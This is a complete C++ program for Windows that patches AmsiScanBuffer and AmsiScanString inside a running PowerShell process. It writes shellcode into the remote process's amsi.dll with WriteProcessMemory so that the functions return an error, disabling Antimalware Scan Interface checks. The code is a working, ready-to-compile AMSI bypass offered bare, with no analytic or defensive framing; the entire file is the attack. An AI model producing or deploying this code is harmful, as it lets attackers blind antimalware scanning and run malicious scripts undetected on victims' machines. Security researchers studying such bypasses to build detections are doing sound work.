#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string>

LPVOID GetRemoteModuleHandle(DWORD dwPID, const wchar_t* moduleName) {
    MODULEENTRY32W moduleEntry;
    moduleEntry.dwSize = sizeof(MODULEENTRY32W);
    HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, dwPID);
    if (hModuleSnap == INVALID_HANDLE_VALUE) {
        printf("Error creating module snapshot: %d\n", GetLastError());
        return NULL;
    }

    if (Module32FirstW(hModuleSnap, &moduleEntry)) {
        do {
            if (_wcsicmp(moduleEntry.szModule, moduleName) == 0) {
                CloseHandle(hModuleSnap);
                return moduleEntry.modBaseAddr;
            }
        } while (Module32NextW(hModuleSnap, &moduleEntry));
    }

    CloseHandle(hModuleSnap);
    return NULL;
}

int getPIDbyProcName(const std::string& procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    if (Process32FirstW(hSnap, &pe32) != FALSE) {
        while (pid == 0 && Process32NextW(hSnap, &pe32) != FALSE) {
            std::wstring wideProcName(procName.begin(), procName.end());
            if (wcscmp(pe32.szExeFile, wideProcName.c_str()) == 0) {
                pid = pe32.th32ProcessID;
            }
        }
    }
    CloseHandle(hSnap);
    return pid;
}

FARPROC GetProcAddressRemote(DWORD dwPID, const wchar_t* moduleName, const char* functionName) {
    // Temporarily load the DLL into our process
    HMODULE hModule = LoadLibraryW(moduleName);
    if (hModule == NULL) {
        printf("Could not load %ws locally. Error: %d\n", moduleName, GetLastError());
        return NULL;
    }

    // Get the function address in our local copy
    FARPROC localFuncAddr = GetProcAddress(hModule, functionName);
    if (localFuncAddr == NULL) {
        printf("Could not find function %s in %ws. Error: %d\n", functionName, moduleName, GetLastError());
        FreeLibrary(hModule);
        return NULL;
    }

    // Calculate the offset from the module base
    DWORD_PTR offset = (DWORD_PTR)localFuncAddr - (DWORD_PTR)hModule;

    // Free the DLL we temporarily loaded
    FreeLibrary(hModule);

    // Get the module base in the remote process
    LPVOID remoteModuleBase = GetRemoteModuleHandle(dwPID, moduleName);
    if (remoteModuleBase == NULL) {
        printf("Could not find module %ws in the remote process.\n", moduleName);
        return NULL;
    }

    // Calculate the remote address
    return (FARPROC)((DWORD_PTR)remoteModuleBase + offset);
}

BOOL PatchRemoteFunction(DWORD dwPID, LPVOID remoteFunctionAddress) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (hProcess == NULL) {
        printf("Error opening process: %d\n", GetLastError());
        return FALSE;
    }

    // Shellcode for 64-bit or 32-bit
#ifdef _WIN64
    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 80070057h (E_INVALIDARG)
        0xC3                           // ret
    };
#else
    unsigned char patch[] = {
        0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, 80070057h
        0xC2, 0x18, 0x00               // ret 18h
    };
#endif

    SIZE_T patchSize = sizeof(patch);
    DWORD oldProtect;

    // Change memory protection
    if (!VirtualProtectEx(hProcess, remoteFunctionAddress, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Error changing memory protection: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }

    // Write the patch
    if (!WriteProcessMemory(hProcess, remoteFunctionAddress, patch, patchSize, NULL)) {
        printf("Error writing to memory: %d\n", GetLastError());
        VirtualProtectEx(hProcess, remoteFunctionAddress, patchSize, oldProtect, &oldProtect);
        CloseHandle(hProcess);
        return FALSE;
    }

    // Restore original protection
    VirtualProtectEx(hProcess, remoteFunctionAddress, patchSize, oldProtect, &oldProtect);

    // Update instruction cache
    FlushInstructionCache(hProcess, remoteFunctionAddress, patchSize);

    CloseHandle(hProcess);
    return TRUE;
}

int main() {
    // Find PowerShell process
    DWORD pid = getPIDbyProcName("powershell.exe");
    if (pid == 0) {
        printf("Could not find powershell.exe process\n");
        return 1;
    }

    printf("PowerShell process found with PID: %d\n", pid);

    const wchar_t* dllName = L"amsi.dll";
    const char* functionNames[] = { "AmsiScanBuffer", "AmsiScanString" };
    int functionCount = sizeof(functionNames) / sizeof(functionNames[0]);

    // Loop through both functions to patch
    for (int i = 0; i < functionCount; i++) {
        const char* functionName = functionNames[i];

        // Get the address of the target function in the remote process
        FARPROC remoteFunctionAddress = GetProcAddressRemote(pid, dllName, functionName);
        if (remoteFunctionAddress == NULL) {
            printf("Could not get address of %s in the remote process.\n", functionName);
            continue;  // Try the next function
        }

        printf("Remote address of %s: 0x%p\n", functionName, remoteFunctionAddress);

        // Patch the function
        if (PatchRemoteFunction(pid, remoteFunctionAddress)) {
            printf("Successfully patched %s in process %d\n", functionName, pid);
        }
        else {
            printf("Failed to patch %s in process %d\n", functionName, pid);
        }
    }

    printf("AMSI bypass operation completed.\n");
    return 0;
}